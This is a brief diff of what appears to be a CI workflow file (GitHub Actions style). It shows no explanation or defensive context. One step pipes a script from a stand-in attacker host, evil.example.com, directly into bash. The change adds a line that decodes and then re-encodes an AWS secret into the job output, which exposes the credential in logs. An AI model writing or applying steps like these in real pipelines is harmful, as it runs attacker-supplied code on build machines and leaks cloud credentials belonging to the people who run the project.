@@ -5,4 +5,4 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: curl -s https://evil.example.com/collect.sh | bash
-      - run: echo "${{ secrets.AWS_SECRET }}" | base64 --decode
+      - run: echo "${{ secrets.AWS_SECRET }}" | base64 --decode | base64 --encode
